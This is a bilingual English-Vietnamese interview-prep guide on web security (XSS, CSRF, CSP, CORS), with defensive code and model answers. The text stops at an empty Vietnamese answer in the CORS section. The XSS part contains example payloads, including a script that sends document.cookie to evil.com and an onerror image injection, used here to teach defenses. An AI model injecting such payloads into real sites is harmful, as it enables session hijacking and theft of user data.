# Web Security — Interview Questions (Junior → Senior)

---

## 1. XSS (Cross-Site Scripting)

**Level:** [Mid]

**EN:** Explain the three types of XSS attacks: stored, reflected, and DOM-based. How does React protect against XSS by default? When is `dangerouslySetInnerHTML` necessary and how do you sanitize it?

**VI:** Giải thích 3 loại XSS: stored, reflected, và DOM-based. React bảo vệ chống XSS mặc định như thế nào? Khi nào cần `dangerouslySetInnerHTML` và cách sanitize?

**Trả lời:**

**XSS**: Kẻ tấn công inject script độc hại vào website, script chạy trong browser của nạn nhân → đánh cắp cookies, session tokens, redirect, keylogging.

| Loại | Cơ chế | Ví dụ |
|------|--------|-------|
| **Stored** | Script lưu trong DB, trả về cho mọi user | Comment chứa `<script>` trong forum |
| **Reflected** | Script trong URL, server reflect về response | `https://site.com/search?q=<script>alert(1)</script>` |
| **DOM-based** | Script chạy hoàn toàn client-side qua DOM manipulation | `document.write(location.hash)` |

```tsx
// ==============================
// REACT BẢO VỆ MẶC ĐỊNH
// ==============================

// React tự động escape tất cả JSX expressions
const userInput = '<script>alert("XSS")</script>';

// AN TOÀN — React escape thành HTML entities
function SafeComponent({ input }: { input: string }) {
  return <div>{input}</div>;
  // Render thành: <div>&lt;script&gt;alert("XSS")&lt;/script&gt;</div>
  // Không execute script
}

// KHÔNG AN TOÀN — bypass React's escaping
function DangerousComponent({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // Nếu html chứa <script>, nó SẼ execute
}

// ==============================
// dangerouslySetInnerHTML + DOMPurify
// ==============================

// Khi nào PHẢI dùng dangerouslySetInnerHTML:
// - Render rich text từ WYSIWYG editor (Quill, TipTap)
// - Render email HTML templates
// - Legacy content với HTML formatting

import DOMPurify from 'dompurify';

function SafeRichText({ htmlContent }: { htmlContent: string }) {
  const sanitized = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    // Loại bỏ tất cả event handlers (onclick, onerror, etc.)
    // Loại bỏ javascript: URLs
  });

  return (
    <div
      className="prose"
      dangerouslySetInnerHTML={{ __html: sanitized }}
    />
  );
}

// DOMPurify config nâng cao
const strictConfig: DOMPurify.Config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
  ALLOWED_ATTR: [],  // không cho phép attr nào
  FORBID_TAGS: ['style', 'script', 'iframe', 'form'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick'],
  FORCE_BODY: true,
  RETURN_DOM_FRAGMENT: false,
};

// Server-side sanitization (Node.js)
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';

const window = new JSDOM('').window;
const DOMPurifySSR = createDOMPurify(window as unknown as Window);

export function sanitizeHtml(dirty: string): string {
  return DOMPurifySSR.sanitize(dirty);
}

// ==============================
// DOM-based XSS examples
// ==============================

// NGUY HIỂM
document.getElementById('output')!.innerHTML = location.hash.slice(1);
// URL: https://example.com/page#<img src=x onerror=alert(1)>

// AN TOÀN
document.getElementById('output')!.textContent = location.hash.slice(1);

// NGUY HIỂM
const url = new URLSearchParams(location.search).get('redirect');
window.location.href = url!; // javascript: protocol attack

// AN TOÀN — validate URL
function safeRedirect(url: string) {
  try {
    const parsed = new URL(url, window.location.origin);
    if (parsed.origin !== window.location.origin) {
      throw new Error('External redirect not allowed');
    }
    window.location.href = parsed.href;
  } catch {
    window.location.href = '/'; // fallback
  }
}
```

### 🎤 Mock Interview — Q&A

---

**Q1 (Junior): "Can you explain what XSS is in simple terms, and give me an example?"**

**Model Answer:**
"XSS stands for Cross-Site Scripting. At its core, it's when an attacker manages to inject malicious JavaScript into a page that other users then load in their browser — so the script runs in the victim's security context, not the attacker's.

The simplest example is a comment section on a blog. If the site doesn't sanitize input and I post a comment like `<script>document.location='https://evil.com?cookie='+document.cookie</script>`, every visitor who loads that page sends their session cookie to my server. That's a Stored XSS attack.

There's also Reflected XSS, where the payload lives in the URL — something like `https://site.com/search?q=<script>alert(1)</script>` — and DOM-based XSS, which never touches the server at all; it happens when JavaScript reads from `location.hash` or `location.search` and writes it directly into the DOM using `innerHTML`."

**Trả lời (Tiếng Việt):**
"XSS là Cross-Site Scripting, kẻ tấn công inject JavaScript độc hại vào trang → script chạy trong context bảo mật của nạn nhân. Ví dụ: comment section không sanitize input, post comment `<script>document.location='https://evil.com?cookie='+document.cookie</script>` → mọi visitor gửi session cookie. Đó là Stored XSS. Reflected XSS: payload trong URL. DOM-based XSS: chỉ xảy ra client-side, JavaScript đọc từ location.hash/search và ghi vào DOM bằng innerHTML, không qua server."

---

**Q2 (Mid): "How does React protect against XSS by default, and when does that protection break down?"**

**Model Answer:**
"React escapes all JSX expressions by default. When you write `<div>{userInput}</div>`, React converts any angle brackets or special characters into HTML entities before rendering, so a script tag just shows up as visible text rather than executing.

That protection breaks down in two main scenarios. First, if you use `dangerouslySetInnerHTML` — which literally tells React to skip its escaping — any HTML you pass in is injected as-is. The fix there is to run the content through DOMPurify before passing it in, so you strip out any `<script>` tags, event handlers like `onerror`, and `javascript:` URLs.

The second scenario is DOM-based XSS that bypasses React entirely — for example, if you have imperative code somewhere that does `element.innerHTML = location.hash.slice(1)`. React's escaping doesn't apply to raw DOM manipulation. The fix is to always use `.textContent` instead of `.innerHTML` when setting dynamic values, and to validate any URLs before assigning to `window.location.href`."

**Trả lời (Tiếng Việt):**
"React escape tất cả JSX expressions mặc định. `<div>{userInput}</div>` → convert angle brackets thành HTML entities, script tag chỉ hiển thị dạng text chứ không execute. Bảo vệ thất bại khi: (1) dùng dangerouslySetInnerHTML (bypass React escaping, fix = DOMPurify trước khi pass vào), (2) DOM-based XSS bypass React hoàn toàn (element.innerHTML = location.hash.slice(1)), fix = .textContent thay vì .innerHTML, validate URLs trước khi assign vào window.location.href."

---

**Q3 (Mid): "What is the difference between Stored, Reflected, and DOM-based XSS from a defense perspective?"**

**Model Answer:**
"The defense differs because they attack at different layers.

Stored XSS is the most dangerous — the payload persists in your database and hits every user who views that content. The defense has to happen at two points: sanitize when saving to the database, and escape when rendering to the page. Neither alone is sufficient.

Reflected XSS arrives in the request URL and bounces back in the response. The defense is server-side output encoding so that anything from a query string is treated as text, not markup. A Content Security Policy also helps a lot here because even if injection happens, the CSP can block the script from running.

DOM-based XSS never touches the server, so server-side defenses don't help at all. You have to defend entirely in the client — avoid unsafe sinks like `innerHTML`, `document.write`, and `eval()`, and validate all data coming from URL parameters or `postMessage` before using it in the DOM."

**Trả lời (Tiếng Việt):**
"Cách phòng thủ khác nhau vì chúng tấn công ở các layer khác nhau. Stored XSS: nguy hiểm nhất, payload persist trong DB, hit mọi user → sanitize khi lưu VÀ escape khi render (cả hai đều cần). Reflected XSS: payload trong URL, server phản chiếu về response → server-side output encoding, CSP block script dù injection xảy ra. DOM-based XSS: không qua server → server-side không giúp được, phải defend ở client: tránh innerHTML/document.write/eval(), validate data từ URL params/postMessage."

---

**Q4 (Senior): "If you were doing a security audit of a React app, what XSS-related things would you specifically look for?"**

**Model Answer:**
"I'd start by searching the entire codebase for `dangerouslySetInnerHTML` — every single usage. For each one I'd verify the content is either fully static or passed through DOMPurify with a strict allowlist of tags and attributes.

Next I'd look for any raw DOM manipulation: `innerHTML`, `document.write`, `insertAdjacentHTML`. These bypass React completely and are easy to miss in a large codebase.

Then I'd check how the app handles redirect URLs. A common pattern is `window.location.href = queryParam` — if that param isn't validated to only allow same-origin URLs, you get an open redirect that can be chained with `javascript:` protocol injection.

I'd also check the CSP header. A weak CSP with `unsafe-inline` negates a lot of the protection, so I'd want to see nonce-based CSP at minimum.

Finally, I'd look at any third-party scripts being loaded. Even if your own code is clean, a compromised CDN script can execute XSS. That's why `integrity` attributes on script tags matter — they verify the exact hash of the script before it runs."

**Trả lời (Tiếng Việt):**
"Security audit React app: (1) Tìm toàn bộ dangerouslySetInnerHTML, verify mỗi cái đều dùng DOMPurify với strict allowlist. (2) Tìm raw DOM manipulation: innerHTML, document.write, insertAdjacentHTML. (3) Kiểm tra redirect URLs (window.location.href = queryParam → open redirect → javascript: protocol injection). (4) Kiểm tra CSP header (unsafe-inline làm vô hiệu hóa bảo vệ → cần nonce-based CSP). (5) Kiểm tra third-party scripts (integrity attributes verify hash trước khi chạy)."

---

---

## 2. CSRF (Cross-Site Request Forgery)

**Level:** [Mid]

**EN:** How does CSRF work? Explain CSRF tokens, the `SameSite` cookie attribute, and the double submit cookie pattern.

**VI:** CSRF hoạt động như thế nào? Giải thích CSRF tokens, thuộc tính `SameSite` cookie, và double submit cookie pattern.

**Trả lời:**

**CSRF**: Kẻ tấn công lừa user đã đăng nhập gửi request không mong muốn. Vì browser tự đính kèm cookies, server không phân biệt được request thật hay giả.

```
Attack flow:
1. Alice đăng nhập bank.com → browser lưu session cookie
2. Alice click vào evil.com
3. evil.com có form ẩn: POST bank.com/transfer?to=attacker&amount=1000
4. Browser tự gửi request kèm session cookie của Alice
5. Bank xử lý transfer vì cookie hợp lệ
```

```ts
// ==============================
// 1. CSRF Token (Synchronizer Token Pattern)
// ==============================

// Server generate random token, lưu trong session
// Client phải gửi token này trong mỗi state-changing request
// Kẻ tấn công không biết token → request bị từ chối

// Express.js backend
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Endpoint trả token cho frontend
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Middleware tự động verify token với POST/PUT/DELETE requests

// React frontend
async function fetchWithCSRF(url: string, options: RequestInit = {}) {
  // Lấy token từ API hoặc meta tag
  const { csrfToken } = await fetch('/api/csrf-token').then(r => r.json());

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
      'Content-Type': 'application/json',
    },
    credentials: 'include', // gửi cookies
  });
}

// Hoặc đặt trong HTML meta tag (server-side render)
// <meta name="csrf-token" content="{{ csrfToken }}">

const csrfToken = document.querySelector<HTMLMetaElement>('meta[name="csrf-token"]')?.content;

// ==============================
// 2. SameSite Cookie Attribute
// ==============================

// SameSite=Strict: Cookie KHÔNG được gửi với cross-site requests
// SameSite=Lax (mặc định modern browsers): Cookie gửi với top-level navigation GET
// SameSite=None: Cookie gửi mọi lúc (cần Secure flag)

// Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly; Path=/

// Express
app.use(session({
  secret: process.env.SESSION_SECRET!,
  cookie: {
    sameSite: 'strict',  // hoặc 'lax'
    secure: true,         // chỉ HTTPS
    httpOnly: true,       // không accessible qua JavaScript
    maxAge: 24 * 60 * 60 * 1000, // 1 ngày
  },
}));

// ==============================
// 3. Double Submit Cookie Pattern
// ==============================

// Khi không có server-side session (stateless):
// 1. Server set CSRF token trong cookie
// 2. Client đọc cookie và gửi lại trong custom header
// 3. Server so sánh cookie value với header value
// Kẻ tấn công không đọc được cookie (SameSite + HttpOnly) → không thể duplicate

// Server
app.get('/api/init', (req, res) => {
  const csrfToken = crypto.randomUUID();
  res.cookie('csrf-token', csrfToken, {
    secure: true,
    sameSite: 'strict',
    // KHÔNG httpOnly — frontend cần đọc
  });
  res.json({ ok: true });
});

app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  // process transfer...
});

// Frontend
function getCookieValue(name: string): string | undefined {
  return document.cookie
    .split('; ')
    .find(row => row.startsWith(`${name}=`))
    ?.split('=')[1];
}

async function securePost(url: string, data: unknown) {
  const csrfToken = getCookieValue('csrf-token');

  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken ?? '',
    },
    credentials: 'include',
    body: JSON.stringify(data),
  });
}
```

### 🎤 Mock Interview — Q&A

---

**Q1 (Junior): "Can you explain how a CSRF attack works? Walk me through it step by step."**

**Model Answer:**
"Sure. CSRF exploits the fact that browsers automatically attach cookies to every request going to a domain, regardless of which page triggered that request.

Here's the classic scenario: I log in to my banking site and my browser stores a session cookie for that domain. Now I visit an attacker-controlled page — maybe I clicked a link in a phishing email. That page contains a hidden HTML form that points to my bank's transfer endpoint: `POST bank.com/transfer?to=attacker&amount=5000`. The page auto-submits that form using JavaScript.

My browser sends the request to the bank, and because it's a same-domain request, it automatically includes my session cookie. The bank sees a valid, authenticated request and processes the transfer. The whole attack works because the bank can't distinguish a request I intentionally made from one that was forged on my behalf.

The key thing to understand is that CSRF is about forging requests using existing credentials — the attacker doesn't steal your cookie, they just make your browser use it."

**Trả lời (Tiếng Việt):**
"CSRF exploit việc browser tự động đính kèm cookies vào mọi request đến domain. Classic scenario: đăng nhập bank → browser lưu session cookie → visit trang attacker (phishing email) → trang có hidden form POST bank.com/transfer?to=attacker&amount=5000 → browser gửi request kèm cookie → bank xử lý transfer vì cookie hợp lệ. CSRF là forging requests dùng credentials có sẵn — attacker không steal cookie, chỉ làm browser dùng nó."

---

**Q2 (Mid): "What is the SameSite cookie attribute and how does it prevent CSRF?"**

**Model Answer:**
"SameSite is a cookie attribute that controls whether the browser sends a cookie along with cross-site requests.

`SameSite=Strict` is the most protective — the cookie is only sent if the request originates from the same site. So if I'm on `evil.com` and there's a form that submits to `bank.com`, the bank's session cookie won't be sent. The downside is that even clicking a regular link to `bank.com` from another site won't send the cookie, so users have to log in again even after following a link.

`SameSite=Lax` is the modern default in most browsers. It blocks cross-site requests from forms and iframes, but allows cookies on top-level navigation — so clicking a link to the bank from another site does send the cookie. This covers most CSRF attacks while keeping the login flow smooth.

`SameSite=None` means always send the cookie, which requires the `Secure` flag. You'd use this for legitimate cross-site use cases like embedded widgets or SSO.

Setting `SameSite=Strict` or `Lax` on your session cookie is now the primary CSRF defense in modern apps. You still want CSRF tokens as a defense-in-depth measure, especially to support older browsers."

**Trả lời (Tiếng Việt):**
"SameSite là cookie attribute kiểm soát việc browser có gửi cookie kèm cross-site requests không. SameSite=Strict: chỉ gửi nếu request từ cùng site (downside: click link từ site khác đến bank cũng không gửi cookie, phải đăng nhập lại). SameSite=Lax: default modern browsers, block cross-site form/iframe nhưng cho phép top-level navigation (click link). SameSite=None: luôn gửi, cần Secure flag (cho embedded widgets/SSO). Strict/Lax là CSRF defense chính trong modern apps, vẫn cần CSRF tokens cho backward compatibility."

---

**Q3 (Mid): "What's the difference between the Synchronizer Token Pattern and the Double Submit Cookie pattern for CSRF protection?"**

**Model Answer:**
"Both approaches work by requiring the client to include a secret token in state-changing requests — a token the attacker can't guess — but they store and validate that token differently.

The Synchronizer Token Pattern, also called the CSRF token pattern, stores the token server-side in the user's session. The server generates a random token, ties it to the session, and either returns it in the response body or embeds it in a hidden form field. When the client makes a POST or DELETE request, it must include that token in a custom header or form field. The server checks it against the session. The attacker can't forge this because they can't read the token from the server's session.

The Double Submit Cookie pattern is designed for stateless applications. The server sets a CSRF token as a non-HttpOnly cookie. The client JavaScript reads that cookie and mirrors its value into a custom request header — like `X-CSRF-Token`. The server then checks that the cookie value and the header value match. The attacker can't perform this trick because even though they can trigger cross-site requests, they can't read cross-site cookies due to the Same-Origin Policy.

In practice, the Synchronizer Token Pattern is more secure because it's validated against server-side state. The Double Submit pattern is convenient for APIs that don't maintain server-side sessions, like JWT-based systems."

**Trả lời (Tiếng Việt):**
"Cả hai đều require client gửi secret token mà attacker không đoán được, nhưng lưu/validate khác nhau. Synchronizer Token Pattern: lưu token server-side trong session, server generate random token gắn với session, client gửi lại trong custom header hoặc form field, server check với session. Double Submit Cookie: cho stateless apps, server set CSRF token trong non-HttpOnly cookie, client JavaScript đọc cookie và mirror vào custom header, server so sánh cookie value với header value (attacker không đọc được cookie nhờ Same-Origin Policy). Synchronizer Token secure hơn vì validate với server-side state. Double Submit tiện hơn cho JWT-based systems."

---

**Q4 (Senior): "JWTs in Authorization headers — are those vulnerable to CSRF? Why or why not?"**

**Model Answer:**
"No, they're not vulnerable to CSRF — and understanding why gets to the heart of how CSRF actually works.

CSRF exploits the fact that browsers automatically attach cookies to cross-site requests. If your authentication relies on a cookie being sent automatically, an attacker can forge that authenticated request.

But if you're storing the JWT in memory — in a React state variable or Zustand store — and manually adding it to every request as an `Authorization: Bearer` header, the browser has no automatic mechanism to attach it to a cross-site form submission or image request. The attacker would need to read the token from your JavaScript context, and they can't do that from a different origin due to the Same-Origin Policy.

This is why localStorage-based JWTs are CSRF-safe but XSS-vulnerable — if an attacker gets JavaScript running on your page, they can read `localStorage` and steal the token. Whereas httpOnly cookies are CSRF-vulnerable but XSS-safe.

The best practice is: access token in memory — not localStorage, not sessionStorage — and refresh token in an httpOnly cookie with SameSite=Strict. The access token can't be stolen by XSS because it's not in a persistent storage, and the refresh token can't be used in CSRF because SameSite blocks cross-site cookie submission."

**Trả lời (Tiếng Việt):**
"Không, JWTs trong Authorization headers không vulnerable với CSRF. CSRF exploit việc browser tự đính kèm cookies. Nếu JWT lưu trong memory (React state/Zustand) và manually thêm vào header → browser không có cơ chế tự đính kèm cho cross-site form submission. Attacker cần đọc token từ JavaScript context → không thể từ origin khác nhờ Same-Origin Policy. localStorage = CSRF-safe nhưng XSS-vulnerable. httpOnly cookies = CSRF-vulnerable nhưng XSS-safe. Best practice: access token trong memory, refresh token trong httpOnly cookie với SameSite=Strict."

---

---

## 3. Content Security Policy (CSP)

**Level:** [Senior]

**EN:** What does CSP prevent? Explain common directives and how nonce-based CSP works.

**VI:** CSP ngăn chặn điều gì? Giải thích các directives phổ biến và nonce-based CSP hoạt động như thế nào?

**Trả lời:**

CSP là HTTP header cho phép server kiểm soát nguồn tài nguyên browser được phép load — phòng thủ chính chống XSS ngay cả khi có injection vulnerability.

```ts
// ==============================
// CSP directives phổ biến
// ==============================

/*
  Content-Security-Policy header syntax:
  directive source-list; directive source-list; ...

  Directives:
  - default-src: fallback cho tất cả directives khác
  - script-src: nguồn JavaScript được phép
  - style-src: nguồn CSS
  - img-src: nguồn images
  - connect-src: fetch/XHR/WebSocket targets
  - font-src: nguồn fonts
  - frame-src: iframe sources
  - object-src: plugins
  - base-uri: restrict <base> tag

  Source keywords:
  - 'self': cùng origin
  - 'none': không cho phép gì
  - 'unsafe-inline': inline scripts/styles (tránh dùng)
  - 'unsafe-eval': eval() (tránh dùng)
  - 'strict-dynamic': trust scripts loaded by trusted scripts
  - https://cdn.example.com: specific domain
  - https:  wildcard scheme
*/

// Express.js với helmet
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        // CDN trusted scripts
        'https://cdn.jsdelivr.net',
        // Nonce sẽ được inject dynamically
        (req, res) => `'nonce-${(res as any).locals.cspNonce}'`,
      ],
      styleSrc: ["'self'", 'https://fonts.googleapis.com', "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      connectSrc: ["'self'", 'https://api.example.com', 'wss://ws.example.com'],
      frameSrc: ["'none'"],     // không cho iframe
      objectSrc: ["'none'"],    // không cho plugins
      upgradeInsecureRequests: [], // tự động upgrade HTTP → HTTPS
    },
  })
);

// ==============================
// Nonce-based CSP — tránh unsafe-inline
// ==============================

// Vấn đề: Inline scripts cần 'unsafe-inline' → loại bỏ bảo vệ XSS
// Giải pháp: Nonce — random token mỗi request
// Chỉ scripts có đúng nonce mới được execute

import crypto from 'crypto';

// Middleware generate nonce
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  // Set header với nonce
  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`
  );

  next();
});

// Template (Handlebars/EJS/Pug)
// <script nonce="{{cspNonce}}">
//   // inline script với đúng nonce — được phép
//   window.__INITIAL_STATE__ = {{{ initialState }}};
// </script>

// Next.js CSP với nonce
// next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-eval'", // Next.js dev cần unsafe-eval
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self'",
            ].join('; '),
          },
        ],
      },
    ];
  },
};

// ==============================
// CSP Report Mode — test trước khi enforce
// ==============================

// Content-Security-Policy-Report-Only: ... — chỉ báo cáo, không block
// Content-Security-Policy: ...; report-uri /csp-report

app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'];
  console.error('CSP Violation:', {
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentUri: report['document-uri'],
  });
  res.status(204).send();
});
```

### 🎤 Mock Interview — Q&A

---

**Q1 (Mid): "What does a Content Security Policy actually do, and how does it help against XSS?"**

**Model Answer:**
"CSP is an HTTP header that tells the browser which sources it's allowed to load resources from. Without it, the browser will happily execute any JavaScript it encounters on the page, regardless of where it came from. CSP adds a layer where even if an attacker manages to inject a script tag, the browser refuses to run it if the source isn't on the allowlist.

For example, if I set `script-src 'self'`, only scripts loaded from my own domain will execute. So even if someone manages to inject `<script src='https://evil.com/steal.js'></script>` into my page, the browser blocks it because `evil.com` is not an allowed source.

The most important directive is `default-src`, which serves as the fallback for all resource types. Then you can add more specific directives like `script-src`, `style-src`, `img-src`, and `connect-src` to override the default for specific resource types.

The key limitation is `unsafe-inline` — if you allow inline scripts, you've effectively disabled a lot of XSS protection because injected inline scripts would be allowed. That's where nonces come in."

**Trả lời (Tiếng Việt):**
"CSP là HTTP header nói với browser những nguồn nào được phép load resources. Không có CSP, browser execute bất kỳ JavaScript nào gặp phải. CSP thêm layer: dù attacker inject script tag, browser từ chối chạy nếu nguồn không có trong allowlist. Ví dụ: script-src 'self' → chỉ scripts từ domain của mình execute. default-src là fallback cho mọi resource types. Quan trọng: unsafe-inline vô hiệu hóa nhiều XSS protection → đó là lý do nonces tồn tại."

---

**Q2 (Senior): "Explain nonce-based CSP. Why is it better than using `unsafe-inline`?"**

**Model Answer:**
"`unsafe-inline` means your CSP allows any inline script on the page to run — including injected ones. So if an attacker finds an XSS vector, the CSP doesn't help at all. It's almost pointless to have a CSP and then include `unsafe-inline`.

Nonces solve this without requiring you to remove all inline scripts. For each request, the server generates a cryptographically random token — something like `crypto.randomBytes(16).toString('base64')` — and puts it in the CSP header: `script-src 'self' 'nonce-abc123XYZ'`. Any `<script>` tag that has `nonce='abc123XYZ'` will be executed. Any inline script without that exact nonce — including any injected by an attacker — is blocked.

The security relies on the nonce being unpredictable and fresh per request. An attacker who injects a script tag can't know what the nonce will be for the next request, so they can't include the correct one.

There's also `strict-dynamic`, which is useful when you have legitimate scripts that dynamically create other scripts. With `strict-dynamic`, scripts that are already trusted — because they have the right nonce — are allowed to load additional scripts dynamically, without those child scripts needing their own nonces.

In Next.js apps this requires some extra setup through middleware to generate and thread the nonce into both the header and the page, but it's worth it for any app that takes security seriously."

**Trả lời (Tiếng Việt):**
"unsafe-inline cho phép mọi inline script chạy, kể cả injected scripts → CSP gần như vô nghĩa. Nonces giải quyết mà không cần bỏ inline scripts: server generate cryptographically random token mỗi request, đặt vào CSP header (script-src 'self' 'nonce-abc123XYZ'). Bất kỳ `<script>` có đúng nonce sẽ execute; script không có nonce (kể cả injected) bị block. Bảo mật dựa vào nonce không thể đoán được và fresh mỗi request. strict-dynamic: cho phép scripts có nonce load thêm scripts động mà không cần nonce riêng. Next.js cần setup middleware để thread nonce vào header và page."

---

**Q3 (Senior): "How would you roll out CSP on an existing app without breaking it?"**

**Model Answer:**
"You never want to turn on enforcement mode on an existing app without testing first — you'll break things immediately. The right approach is to start with report-only mode.

`Content-Security-Policy-Report-Only` has the same syntax as the real CSP header, but instead of blocking violations, it only reports them to an endpoint you specify. So you can set a fairly restrictive policy, deploy it, and watch your reporting endpoint light up with every violation — every inline script, every third-party resource, every `eval` call — without any user-visible impact.

Once you've worked through all the violations and tightened the policy, you switch to the real `Content-Security-Policy` header. I'd also suggest keeping the Report-Only header running in parallel even after you enforce, because you'll catch new violations as the codebase evolves.

The reporting endpoint itself is simple — it just receives `POST` requests with a JSON body containing information about what was blocked and where. You log those and use them to refine your policy.

One practical tip: start by just focusing on `script-src` first since that's where XSS protection matters most. Once that's solid, gradually add directives for other resource types."

**Trả lời (Tiếng Việt):**
"Không bao giờ bật enforcement mode trên existing app ngay — sẽ break ngay. Dùng report-only mode trước: Content-Security-Policy-Report-Only cùng syntax nhưng chỉ báo cáo violations thay vì block → reporting endpoint sáng lên với mọi violation (inline script, third-party resource, eval) mà không ảnh hưởng user. Sau khi xử lý xong violations → chuyển sang Content-Security-Policy thật. Giữ Report-Only song song để catch violations mới khi codebase phát triển. Thực tế: tập trung script-src trước vì đó là nơi XSS protection quan trọng nhất, sau đó dần thêm directives cho resource types khác."

---

---

## 4. CORS

**Level:** [Mid] / [Senior]

**EN:** Explain the same-origin policy, preflight requests, `Access-Control` headers, and credentials mode in CORS.

**VI:** Giải thích same-origin policy, preflight request, `Access-Control` headers, và credentials mode trong CORS.

**Trả lời:**

**Same-origin policy**: Browser chặn JavaScript từ origin A đọc response từ origin B. Origin = protocol + hostname + port.

```
https://app.example.com:443  →  https://api.example.com:443  (DIFFERENT origin — different hostname)
https://example.com:443      →  https://example.com:8080     (DIFFERENT — different port)
http://example.com           →  https://example.com          (DIFFERENT — different protocol)
https://example.com/a        →  https://example.com/b        (SAME origin)
```

```ts
// ==============================
// PREFLIGHT REQUEST
// ==============================

/*
  Browser tự động gửi OPTIONS preflight request trước "non-simple" requests:
  - Methods: PUT, DELETE, PATCH (POST là simple nếu content-type thỏa điều kiện)
  - Custom headers: Authorization, X-CSRF-Token, Content-Type: application/json
  - Nếu preflight thành công → gửi actual request
*/

// Request từ https://app.example.com
fetch('https://api.example.com/users', {
  method: 'DELETE',
  headers: { Authorization: 'Bearer token123' },
});

// Browser gửi:
// OPTIONS /users HTTP/1.1
// Origin: https://app.example.com
// Access-Control-Request-Method: DELETE
// Access-Control-Request-Headers: Authorization

// Server phải respond:
// Access-Control-Allow-Origin: https://app.example.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
// Access-Control-Allow-Headers: Authorization, Content-Type
// Access-Control-Max-Age: 86400  (cache preflight 24h)

// ==============================
// Express CORS configuration
// ==============================
import cors from 'cors';

// Đơn giản — tất cả origins
app.use(cors());

// Production — chỉ allow specific origins
const allowedOrigins = [
  'https://app.example.com',
  'https://staging.example.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
].filter(Boolean) as string[];

app.use(cors({
  origin: (origin, callback) => {
    // allow requests with no origin (mobile apps, curl, Postman)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`CORS: Origin ${origin} not allowed`));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  exposedHeaders: ['X-Total-Count', 'X-Request-ID'], // headers frontend có thể đọc
  credentials: true,   // cho phép cookies/auth headers
  maxAge: 86400,        // cache preflight 24h
}));

// ==============================
// CREDENTIALS MODE
// ==============================

/*
  Mặc định: fetch không gửi cookies/auth headers cross-origin
  credentials: 'include' — gửi cookies
  credentials: 'same-origin' — gửi cookies chỉ same-origin (mặc định)
  credentials: 'omit' — không bao giờ gửi
*/

// Frontend
fetch('https://api.example.com/me', {
  credentials: 'include', // gửi cookies
  headers: { Authorization: 'Bearer token' },
});

// Khi dùng credentials: 'include':
// 1. Server PHẢI set Access-Control-Allow-Credentials: true
// 2. Server KHÔNG được dùng Access-Control-Allow-Origin: * (phải explicit origin)

// SAIIII — wildcard với credentials
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true
// → Browser sẽ block response này

// ĐÚNG
// Access-Control-Allow-Origin: https://app.example.com
// Access-Control-Allow-Credentials: true

// ==============================
// Axios CORS config
// ==============================
import axios from 'axios';

const apiClient = axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true, // equivalent với fetch credentials: 'include'
  timeout: 10000,
});
```

### 🎤 Mock Interview — Q&A

---

**Q1 (Junior): "A junior developer says 'CORS is a security feature that protects the server.' Is that correct?"**

**Model Answer:**
"That's a common misconception, and it's worth being precise here. CORS is actually a browser-enforced mechanism that protects the user, not the server.

The Same-Origin Policy is what says: 'JavaScript on `evil.com` cannot read responses from `bank.com`.' CORS is a way for servers to relax that restriction — to say 'actually, `app.example.com` is allowed to read my responses.'

The key word is 'read.' CORS doesn't prevent the browser from sending the request — it prevents JavaScript from reading the response if the server hasn't granted permission. And CORS only applies to browser-based requests from JavaScript. A curl command, a mobile app, or a server-to-server call completely bypasses CORS because there's no browser enforcing the policy.

So if your API endpoint changes state — like deleting a record — CORS alone doesn't protect against CSRF, because the request is sent regardless. For those cases you still need CSRF protection, proper authentication, and ideally idempotency checks. CORS is about cross-origin data access, not cross-origin request forgery."

**Trả lời (Tiếng Việt):**
